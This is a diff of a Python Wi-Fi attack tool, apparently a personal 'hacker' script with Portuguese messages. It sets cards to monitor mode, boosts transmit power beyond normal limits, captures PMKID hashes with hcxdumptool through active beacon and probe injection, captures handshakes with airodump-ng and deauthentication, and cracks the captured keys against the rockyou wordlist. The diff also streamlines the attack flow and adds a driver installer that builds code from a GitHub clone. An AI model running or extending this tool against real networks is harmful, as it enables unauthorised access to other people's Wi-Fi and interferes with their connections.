@@ -59,7 +59,7 @@ def test_injection(interface):
     if stdout and "Injection is working!" in stdout:
         supreme_log("HARDWARE VALIDADO PARA COMBATE.")
         return True
-    supreme_log("HARDWARE LIMITADO: Injeção falhou. Apenas ataques passivos funcionarão.", log_type="error")
+    supreme_log("HARDWARE LIMITADO: Injeção falhou.", log_type="error")
     return False
 
 def boost_signal(interface):
@@ -67,6 +67,22 @@ def boost_signal(interface):
     run_command(f"ip link set {interface} down", sudo=True)
     run_command(f"iw dev {interface} set txpower fixed 3000", sudo=True)
     run_command(f"ip link set {interface} up", sudo=True)
+
+def fix_drivers_wifi6(auto_confirm=False):
+    supreme_log("Diagnosticando Wi-Fi 6...", log_type="cmd")
+    stdout_usb, _ = run_command("lsusb")
+    chipset = None
+    if "8852" in stdout_usb: chipset = "RTL8852AU"
+    elif "8832" in stdout_usb: chipset = "RTL8832AU"
+    elif "7921" in stdout_usb: chipset = "MT7921AU"
+    if not chipset: return False
+    if auto_confirm or Confirm.ask(f"Instalar drivers para {chipset}?"):
+        run_command("apt update && apt install -y build-essential git dkms raspberrypi-kernel-headers", sudo=True)
+        if "RTL" in chipset:
+            run_command("git clone https://github.com/lwfinger/rtl8852au.git /tmp/rtl8852au", sudo=True)
+            run_command("cd /tmp/rtl8852au && make && make install", sudo=True)
+        return True
+    return False
 
 def run_command(command, sudo=False, capture_output=True, text=True):
     if sudo: command = "sudo " + command
@@ -109,25 +125,21 @@ def set_managed_mode(interface):
     run_command("nmcli networking on", sudo=True)
 
 def capture_vetor_x(monitor_interface, bssid, channel, output_file):
-    supreme_log(f"ATIVANDO VETOR X (INCURSÃO TOTAL) contra {bssid}...", log_type="cmd")
+    supreme_log(f"ATIVANDO VETOR X contra {bssid}...", log_type="cmd")
     pcapng = f"{output_file}_vetorX.pcapng"; hashf = f"{output_file}_vetorX.16800"
     run_command(f"rm -f {pcapng} {hashf}", sudo=True)
     run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
     cmd = f"sudo hcxdumptool -i {monitor_interface} -o {pcapng} --enable_status=31 --active_beacon --proberequest --wps"
-    supreme_log("Injetando Beacons Ativos e Probe Requests (Força Bruta de Camada 2)...")
     try:
         proc = subprocess.Popen(cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
         time.sleep(120); proc.terminate()
     except: pass
     if os.path.exists(pcapng):
         run_command(f"hcxpcapngtool -o {hashf} {pcapng}")
-        if os.path.exists(hashf) and os.path.getsize(hashf) > 0:
-            supreme_log("VITÓRIA TÁTICA: O VETOR X EXTRAIU A CHAVE!")
-            return hashf
+        if os.path.exists(hashf) and os.path.getsize(hashf) > 0: return hashf
     return None
 
 def capture_pmkid(monitor_interface, bssid, channel, output_file):
-    supreme_log("Iniciando Extração PMKID Stealth...", log_type="cmd")
     pcapng = f"{output_file}_pmkid.pcapng"; hashf = f"{output_file}_pmkid.16800"
     run_command(f"rm -f {pcapng} {hashf}", sudo=True)
     run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
@@ -145,7 +157,6 @@ def capture_pmkid(monitor_interface, bssid, channel, output_file):
     return None
 
 def capture_handshake(monitor_interface, bssid, channel, output_file):
-    supreme_log("Iniciando Deauth Agressivo (MDK4)...", log_type="cmd")
     os.system(f"rm -f {output_file}-01.*")
     run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
     dump_cmd = f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_file} --update 1 {monitor_interface}"
@@ -185,7 +196,7 @@ def start_wifite_expert(interface):
     except: pass
 
 def start_evil_twin(interface, essid):
-    supreme_log("Evil Twin requer configuração externa (Airgeddon recomendada).", log_type="info")
+    supreme_log("Evil Twin em desenvolvimento.", log_type="info")
 
 def scan_networks(monitor_interface):
     boost_signal(monitor_interface)
@@ -213,18 +224,13 @@ def scan_networks(monitor_interface):
     console.print(table)
     choice = IntPrompt.ask("Escolha", choices=[str(i+1) for i in range(len(networks))])
     target = networks[choice - 1]
-    _, advice = analyze_vulnerabilities(target['vendor'], target['essid'], target['privacy'])
-    supreme_log(f"DSI INTEL: {advice}")
-    console.print("[1] VETOR X\n[2] WIFITE2\n[3] Handshake\n[4] Ghost")
-    atk_c = Prompt.ask("Vetor", choices=["1","2","3","4"], default="1")
-    target['attack_type'] = {'1':'vetorx','2':'wifite','3':'handshake','4':'ghost'}[atk_c]
     return target
 
 def main():
     if os.geteuid() != 0: return
     while True:
-        os.system("clear"); print_banner()
-        console.print("\n[1] Incursão HACKER SUPREMO\n[2] Wi-Fi 6 Doctor\n[3] Sair")
+        os.system("clear")
+        console.print("\n[1] Incursão HACKER\n[2] Wi-Fi 6 Doctor\n[3] Sair")
         opcao = Prompt.ask("Ação", choices=["1","2","3"])
         if opcao == '3': return
         elif opcao == '2': fix_drivers_wifi6(); continue
@@ -235,15 +241,9 @@ def main():
     mon = set_monitor_mode(iface)
     try:
         target = scan_networks(mon)
-        if not target: return
-        prefix = f"capture_{target['essid']}"
-        if target['attack_type'] == 'vetorx': cap = capture_vetor_x(mon, target['bssid'], target['channel'], prefix)
-        elif target['attack_type'] == 'wifite': start_wifite_expert(mon); return
-        elif target['attack_type'] == 'ghost': start_ghost_attack(mon, target['essid']); return
-        else: cap = capture_handshake(mon, target['bssid'], target['channel'], prefix)
-        if cap:
-            wordlist = Prompt.ask("Wordlist", default="/usr/share/wordlists/rockyou.txt")
-            crack_hash(cap, wordlist, target['bssid'])
+        if target:
+             cap = capture_vetor_x(mon, target['bssid'], target['channel'], f"capture_{target['essid']}")
+             if cap: crack_hash(cap, "/usr/share/wordlists/rockyou.txt", target['bssid'])
     finally: set_managed_mode(mon)
 
 def crack_hash(hash_file, wordlist_file, bssid=None):
